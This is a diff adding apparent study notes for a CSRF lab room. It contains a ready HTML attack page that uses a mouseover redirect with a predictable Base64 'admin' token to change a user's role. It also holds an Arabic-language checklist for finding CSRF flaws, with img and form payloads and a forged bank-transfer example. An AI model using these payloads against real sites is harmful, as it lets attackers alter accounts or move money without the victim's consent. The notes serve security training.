@@ -505,13 +505,301 @@ setTimeout(function() {
 </details>
 
 
+<details>
+  <summary>Exploitation over Weak Tokens</summary>
+
+
+## cd **`/var/www/html`** create **`role.html`**
+
+
+```
+<html>
+<body>
+
+<h2>StaffHub Internal Notice</h2>
+<p>Move your mouse over the banner below to load the latest role updates.</p>
+
+<img src="http://staffhub.thm:8080/one.png"
+onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
+width="400">
+
+</body>
+</html>
+```
+
+
+
+
+  
+</details>
 
 
 
 
 
+<details>
+  <summary>best practice</summary>
 
 
+
+1) Focus on state-changing requests
+===================================
+
+يعني ركز على أي Request بيغير بيانات.
+
+مثلاً:
+
+❌ مش ده
+
+```
+GET /profile
+```
+
+ده مجرد بيعرض بيانات.
+
+لكن ركز على حاجات زي:
+
+```
+POST /change_password
+```
+
+أو
+
+```
+POST /change_email
+```
+
+أو
+
+```
+POST /update_role
+```
+
+أو
+
+```
+POST /delete_account
+```
+
+أو
+
+```
+POST /transfer_money
+```
+
+كل دي اسمها **State Changing Requests** لأنها بتغير حاجة في قاعدة البيانات.
+
+* * * * *
+
+2) Inspect requests for CSRF Tokens
+===================================
+
+افتح Burp Suite وشوف الريكوست.
+
+مثلاً:
+
+```
+POST /change_emailemail=test@test.com
+```
+
+هل فيه
+
+```
+csrf_token=
+```
+
+ولا لأ؟
+
+### الحالة الأولى
+
+مفيش Token خالص
+
+```
+POST /change_emailemail=test@test.com
+```
+
+يبقى ده غالبًا Vulnerable.
+
+* * * * *
+
+### الحالة الثانية
+
+فيه Token
+
+```
+csrf_token=9ab38fd1298
+```
+
+كويس.
+
+لكن اسأل نفسك:
+
+هل بيتغير؟
+
+ولا ثابت؟
+
+لو كل مرة
+
+```
+csrf_token=12345
+```
+
+يبقى برضه Vulnerable.
+
+* * * * *
+
+### الحالة الثالثة
+
+زي الروم
+
+```
+csrf_token=YWRtaW4=
+```
+
+وده عبارة عن
+
+```
+Base64(admin)
+```
+
+يبقى Token متوقع.
+
+* * * * *
+
+3) Analyse HTTP Methods
+=======================
+
+شوف الريكوست بيتبعت بـ إيه.
+
+الصحيح
+------
+
+```
+POST /change_password
+```
+
+ليه؟
+
+لأن POST أصعب شوية في الاستغلال.
+
+* * * * *
+
+الغلط
+-----
+
+```
+GET /change_password?password=123
+```
+
+أو
+
+```
+GET /update_role?role=staff
+```
+
+ده خطر جدًا.
+
+لأن أي صورة أو لينك يقدر يشغله.
+
+زي
+
+```
+<img src="http://site/change_role?role=staff">
+```
+
+أول ما الصورة تتحمل...
+
+الطلب اتبعت.
+
+وده CSRF.
+
+* * * * *
+
+4) Test the request outside the application
+===========================================
+
+دي أهم خطوة.
+
+يعني بدل ما تبعت الريكوست من الموقع...
+
+اعمله من صفحة HTML أنت.
+
+مثلاً
+
+```
+<img src="http://victim/update_role.php?role=staff">
+```
+
+أو
+
+```
+<form action="http://victim/change_email">
+```
+
+لو اشتغل...
+
+يبقى فيه CSRF.
+
+* * * * *
+
+5) Observe Cookie Behaviour
+===========================
+
+دي نقطة مهمة جدًا.
+
+اسأل نفسك:
+
+الموقع بيعرف المستخدم إزاي؟
+
+مثلاً
+
+```
+Cookie:PHPSESSID=abc123
+```
+
+المتصفح بيبعتها أوتوماتيك.
+
+لو السيرفر اعتمد على الكوكي بس...
+
+يبقى أي موقع خارجي هيخلي المتصفح يبعتها.
+
+وده أصل مشكلة CSRF.
+
+* * * * *
+
+مثال عملي
+=========
+
+أنت عامل Login.
+
+المتصفح عنده
+
+```
+PHPSESSID=11111
+```
+
+دخلت موقع المهاجم.
+
+الموقع فيه
+
+```
+<img src="http://bank/transfer?money=1000">
+```
+
+المتصفح هيعمل
+
+```
+GET /transferCookie:PHPSESSID=11111
+```
+
+البنك هيقول
+
+> ده المستخدم الحقيقي.
+
+وينفذ التحويل.
+
+  
+</details>
 
 
 
